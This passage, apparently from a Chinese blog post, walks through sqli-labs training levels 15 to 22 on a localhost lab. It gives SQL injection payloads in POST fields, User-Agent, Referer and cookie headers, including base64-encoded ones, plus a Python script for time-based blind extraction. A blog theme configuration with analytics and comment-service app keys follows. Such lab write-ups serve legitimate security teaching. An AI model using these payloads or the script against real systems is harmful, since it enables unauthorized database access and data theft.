&amp;submit=Submit</code></pre></p>\n<p><img src=\"/img/2018-08-03/8.png\" srcset=\"/img/static/loading.gif\" alt=\"8\"><br>测试时间型失败，返回时间异常，经常是几分钟才有有回复，测试失败</p>\n<h5 id=\"第十六关\"><a href=\"#第十六关\" class=\"headerlink\" title=\"第十六关\"></a>第十六关</h5><p>post型双引号盲注和第十五关一样<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attribute\">uname</span>=123&amp;passwd=123\") <span class=\"hljs-keyword\">or</span> <span class=\"hljs-string\">\"1\"</span>=<span class=\"hljs-string\">\"1\"</span> -- + &amp;<span class=\"hljs-attribute\">submit</span>=Submit</code></pre></p>\n<p><img src=\"/img/2018-08-03/9.png\" srcset=\"/img/static/loading.gif\" alt=\"9\"></p>\n<h5 id=\"第十七关\"><a href=\"#第十七关\" class=\"headerlink\" title=\"第十七关\"></a>第十七关</h5><p>基于错误的更新查询post注入<br><strong>高版本的mysql已经修复了这个bug</strong><br>有兴趣的可以去了解下<br>–&gt;<a href=\"https://blog.csdn.net/Fly_hps/article/details/79416842\" target=\"_blank\" rel=\"noopener\">传送门</a><br>–&gt;<a href=\"https://blog.csdn.net/u012763794/article/details/51361152\" target=\"_blank\" rel=\"noopener\">传送门</a><br>–&gt;<a href=\"https://www.cnblogs.com/xishaonian/p/6243497.html\" target=\"_blank\" rel=\"noopener\">传送门</a></p>\n<h5 id=\"第十八关\"><a href=\"#第十八关\" class=\"headerlink\" title=\"第十八关\"></a>第十八关</h5><p>请求头User-Agent注入（需要正确的用户名和密码），需要抓包，抓包工具burpsuit（不会使用的自行百度）<br>先抓包<br><img src=\"/img/2018-08-03/10.png\" srcset=\"/img/static/loading.gif\" alt=\"10\"><br>在User-Agent后面加一个单引号<br><pre><code class=\"hljs undefined\">User-<span class=\"hljs-string\">Agent:</span> Mozilla<span class=\"hljs-regexp\">/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/</span><span class=\"hljs-number\">20100101</span> Firefox/<span class=\"hljs-number\">56.0</span><span class=\"hljs-string\">'</span></code></pre></p>\n<p>发现报错，说明可以注入<br><img src=\"/img/2018-08-03/11.png\" srcset=\"/img/static/loading.gif\" alt=\"11\"><br>一般这种注入的sql语句都是insert类型，查看index.php的查询关键代码<br><pre><code class=\"hljs undefined\">$insert=<span class=\"hljs-string\">\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\"</span><span class=\"hljs-comment\">;</span></code></pre></p>\n<p>因为这种方式注入没有回显，一般是基于时间的insert型盲注，通过判断返回时间来注入<br><em>user-agent简写成Mozilla/5.0 Firefox/56.0</em><br><pre><code class=\"hljs undefined\">User-Agent: Mozilla/<span class=\"hljs-number\">5.0</span> Firefox/<span class=\"hljs-number\">56.0</span>' <span class=\"hljs-keyword\">or</span> <span class=\"hljs-built_in\">sleep</span>(<span class=\"hljs-number\">5</span>) <span class=\"hljs-keyword\">or</span> '</code></pre></p>\n<p>最后要闭合单引号，不可以注释掉（我也不知道原因π_π）<br>5秒后返回正常页面<br><img src=\"/img/2018-08-03/12.png\" srcset=\"/img/static/loading.gif\" alt=\"12\"><br>猜测数据库<br><pre><code class=\"hljs undefined\">User-Agent: Mozilla/<span class=\"hljs-number\">5.0</span> Firefox/<span class=\"hljs-number\">56.0</span>' <span class=\"hljs-keyword\">or</span> <span class=\"hljs-keyword\">if</span>(ascii(substr((<span class=\"hljs-built_in\">select</span> database()),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&gt;<span class=\"hljs-number\">97</span>,<span class=\"hljs-built_in\">sleep</span>(<span class=\"hljs-number\">5</span>),<span class=\"hljs-built_in\">sleep</span>(<span class=\"hljs-number\">0</span>)) <span class=\"hljs-keyword\">or</span> '</code></pre></p>\n<p>5秒后返回<br><img src=\"/img/2018-08-03/13.png\" srcset=\"/img/static/loading.gif\" alt=\"13\"><br>盲注当然是写脚本跑啦,python脚本代码如下，稍微修改了一下之前的代码就可以了<br><pre><code class=\"hljs undefined\">import requests\nimport <span class=\"hljs-built_in\">time</span>\n\ntxt1 = <span class=\"hljs-string\">\"Mozilla/5.0 Firefox/56.0' or if(ascii(substr((select database()),\"</span>\ntxt2 = <span class=\"hljs-string\">\",1))&gt;=\"</span>\ntxt3 = <span class=\"hljs-string\">\",1))=\"</span>\ntxt4 = <span class=\"hljs-string\">\",sleep(2),sleep(0)) or '\"</span>\n<span class=\"hljs-built_in\">key</span> = &#123;'uname':'admin','passwd':'admin','submit':'Submit'&#125;\nurl = <span class=\"hljs-string\">\"http://localhost/sqli-labs/Less-18/\"</span>\nnum11 = <span class=\"hljs-number\">97</span>\nnum12 = <span class=\"hljs-number\">65</span>\nnum13 = <span class=\"hljs-number\">48</span>\ncode = ''\nnum1 = <span class=\"hljs-number\">0</span>\nnum2 = <span class=\"hljs-number\">0</span>\nnum3 = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">9</span>):\n\tpayload = txt1+str(i)+txt2+str(num11)+txt4\n\theaders = &#123;'User-Agent': payload&#125;\n\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\tnum1 = <span class=\"hljs-number\">1</span>\n\t\t\n\tpayload = txt1+str(i)+txt2+str(num12)+txt4\n\theaders = &#123;'User-Agent': payload&#125;\n\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\tnum2 = <span class=\"hljs-number\">1</span>\n\n\tpayload = txt1+str(i)+txt2+str(num13)+txt4\n\theaders = &#123;'User-Agent': payload&#125;\n\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\tnum3 = <span class=\"hljs-number\">1</span>\n\n\n\t<span class=\"hljs-keyword\">if</span>(num1 == <span class=\"hljs-number\">1</span>):\n\t\t<span class=\"hljs-built_in\">num</span> = <span class=\"hljs-number\">97</span>\n\t\t<span class=\"hljs-built_in\">num</span> += <span class=\"hljs-number\">13</span>\n\t\tpayload = txt1+str(i)+txt2+str(<span class=\"hljs-built_in\">num</span>)+txt4\n\t\theaders = &#123;'User-Agent': payload&#125;\n\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t<span class=\"hljs-built_in\">num</span> += <span class=\"hljs-number\">6</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-built_in\">num</span> -= <span class=\"hljs-number\">7</span>\n\t\tpayload = txt1+str(i)+txt2+str(<span class=\"hljs-built_in\">num</span>)+txt4\n\t\theaders = &#123;'User-Agent': payload&#125;\n\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t<span class=\"hljs-built_in\">num</span> += <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-built_in\">num</span> -= <span class=\"hljs-number\">3</span>\n\t\tpayload = txt1+str(i)+txt2+str(<span class=\"hljs-built_in\">num</span>)+txt4\n\t\theaders = &#123;'User-Agent': payload&#125;\n\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &lt;=<span class=\"hljs-number\">2</span>):\n\t\t\t<span class=\"hljs-built_in\">num</span> -= <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">if</span>((<span class=\"hljs-built_in\">num</span> == <span class=\"hljs-number\">106</span>) <span class=\"hljs-keyword\">or</span> (<span class=\"hljs-built_in\">num</span> == <span class=\"hljs-number\">119</span>)):\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-built_in\">num</span>,<span class=\"hljs-built_in\">num</span>+<span class=\"hljs-number\">4</span>):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = &#123;'User-Agent': payload&#125;\n\t\t\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\t\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-built_in\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-built_in\">num</span>,<span class=\"hljs-built_in\">num</span>+<span class=\"hljs-number\">3</span>):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = &#123;'User-Agent': payload&#125;\n\t\t\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\t\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-built_in\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t<span class=\"hljs-keyword\">if</span>(num1 == <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">and</span> num2 == <span class=\"hljs-number\">1</span>):\n\t\t<span class=\"hljs-built_in\">num</span> = <span class=\"hljs-number\">65</span>\n\t\t<span class=\"hljs-built_in\">num</span> += <span class=\"hljs-number\">13</span>\n\t\tpayload = txt1+str(i)+txt2+str(<span class=\"hljs-built_in\">num</span>)+txt4\n\t\theaders = &#123;'User-Agent': payload&#125;\n\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t<span class=\"hljs-built_in\">num</span> += <span class=\"hljs-number\">6</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-built_in\">num</span> -= <span class=\"hljs-number\">7</span>\n\t\tpayload = txt1+str(i)+txt2+str(<span class=\"hljs-built_in\">num</span>)+txt4\n\t\theaders = &#123;'User-Agent': payload&#125;\n\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t<span class=\"hljs-built_in\">num</span> += <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-built_in\">num</span> -= <span class=\"hljs-number\">3</span>\n\t\tpayload = txt1+str(i)+txt2+str(<span class=\"hljs-built_in\">num</span>)+txt4\n\t\theaders = &#123;'User-Agent': payload&#125;\n\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &lt;=<span class=\"hljs-number\">2</span>):\n\t\t\t<span class=\"hljs-built_in\">num</span> -= <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">if</span>((<span class=\"hljs-built_in\">num</span> == <span class=\"hljs-number\">74</span>) <span class=\"hljs-keyword\">or</span> (<span class=\"hljs-built_in\">num</span> == <span class=\"hljs-number\">87</span>)):\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-built_in\">num</span>,<span class=\"hljs-built_in\">num</span>+<span class=\"hljs-number\">4</span>):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = &#123;'User-Agent': payload&#125;\n\t\t\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\t\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-built_in\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-built_in\">num</span>,<span class=\"hljs-built_in\">num</span>+<span class=\"hljs-number\">3</span>):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = &#123;'User-Agent': payload&#125;\n\t\t\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\t\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-built_in\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t<span class=\"hljs-keyword\">if</span>(num2 == <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">and</span> num3 == <span class=\"hljs-number\">1</span>):\n\t\t<span class=\"hljs-built_in\">num</span> =<span class=\"hljs-number\">48</span>\n\t\t<span class=\"hljs-built_in\">num</span> += <span class=\"hljs-number\">5</span>\n\t\tpayload = txt1+str(i)+txt2+str(<span class=\"hljs-built_in\">num</span>)+txt4\n\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\treq = requests.<span class=\"hljs-built_in\">get</span>(url = url)\n\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-built_in\">num</span>,<span class=\"hljs-built_in\">num</span>+<span class=\"hljs-number\">5</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = &#123;'User-Agent': payload&#125;\n\t\t\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\t\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-built_in\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-built_in\">num</span> -= <span class=\"hljs-number\">5</span>\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-built_in\">num</span>,<span class=\"hljs-built_in\">num</span>+<span class=\"hljs-number\">5</span>):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = &#123;'User-Agent': payload&#125;\n\t\t\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\t\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-built_in\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span></code></pre></p>\n<p><img src=\"/img/2018-08-03/14.png\" srcset=\"/img/static/loading.gif\" alt=\"14\"></p>\n<h5 id=\"第十九关\"><a href=\"#第十九关\" class=\"headerlink\" title=\"第十九关\"></a>第十九关</h5><p>跟第十八关一样，referer注入，也是insert语句<br>修改请求头<br><pre><code class=\"hljs undefined\">Referer: http://localhost/sqli-labs/Less-19/' or if(ascii(substr((<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&gt;<span class=\"hljs-number\">97</span>,<span class=\"hljs-keyword\">sleep</span>(<span class=\"hljs-number\">5</span>),<span class=\"hljs-keyword\">sleep</span>(<span class=\"hljs-number\">0</span>)) <span class=\"hljs-keyword\">or</span> <span class=\"hljs-string\">'</span></code></pre></p>\n<p><img src=\"/img/2018-08-03/15.png\" srcset=\"/img/static/loading.gif\" alt=\"15\"><br>5秒后页面返回正常，脚本参考上面的</p>\n<h5 id=\"第二十关\"><a href=\"#第二十关\" class=\"headerlink\" title=\"第二十关\"></a>第二十关</h5><p>cookie注入，这一关要先登录，登陆后有cookie才可以注入<br>测试单引号，在cookie后面加一个单引号<br><img src=\"/img/2018-08-03/17.png\" srcset=\"/img/static/loading.gif\" alt=\"17\"><br>用<code>order by</code>测试有多少列<br><pre><code class=\"hljs undefined\">Cookie: <span class=\"hljs-attr\">uname=</span>admin' <span class=\"hljs-keyword\">order</span> <span class=\"hljs-title\">by</span> <span class=\"hljs-number\">4</span><span class=\"hljs-comment\">#</span></code></pre></p>\n<p><img src=\"/img/2018-08-03/18.png\" srcset=\"/img/static/loading.gif\" alt=\"18\"><br>查数据库<br><pre><code class=\"hljs undefined\">Cookie: uname=admin' <span class=\"hljs-built_in\">union</span> <span class=\"hljs-built_in\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,database() limit <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-meta\">#</span></code></pre></p>\n<p><img src=\"/img/2018-08-03/19.png\" srcset=\"/img/static/loading.gif\" alt=\"19\"><br>后面的一样了</p>\n<div style=\"text-align: center\">————————-2018-08-10更新————————-<br></div>\n\n<h5 id=\"第二十一关\"><a href=\"#第二十一关\" class=\"headerlink\" title=\"第二十一关\"></a>第二十一关</h5><p>用<code>admin</code>，<code>admin</code>登陆后抓包看到cooie<br><pre><code class=\"hljs undefined\">Cookie: <span class=\"hljs-attribute\">uname</span>=YWRtaW4%3D</code></pre></p>\n<p>url解码后<code>YWRtaW4=</code>，用base64尝试解码得到<code>admin</code>，那么cookie应该就是用了base64加密过的，和第二十关一样，多了base64加密，<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attribute\">Cookie</span>: uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkgbGltaXQgMSwxIw<span class=\"hljs-number\">%3</span>D<span class=\"hljs-number\">%3</span>D</code></pre></p>\n<p><img src=\"/img/2018-08-03/21.png\" srcset=\"/img/static/loading.gif\" alt=\"21\"></p>\n<h5 id=\"第二十二关\"><a href=\"#第二十二关\" class=\"headerlink\" title=\"第二十二关\"></a>第二十二关</h5><p>和第二十一关一样，单引号变双引号<br><pre><code class=\"hljs undefined\">YWRtaW<span class=\"hljs-number\">4</span>iIHVuaW<span class=\"hljs-number\">9</span>uIH<span class=\"hljs-symbol\">NlbGVjdCAxLDIsZGF0</span>YWJhc<span class=\"hljs-number\">2</span>UoKSBsaW<span class=\"hljs-number\">1</span>pdCAxLDEj</code></pre></p>\n<p>第一部分</p>\n<p>完、</p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont 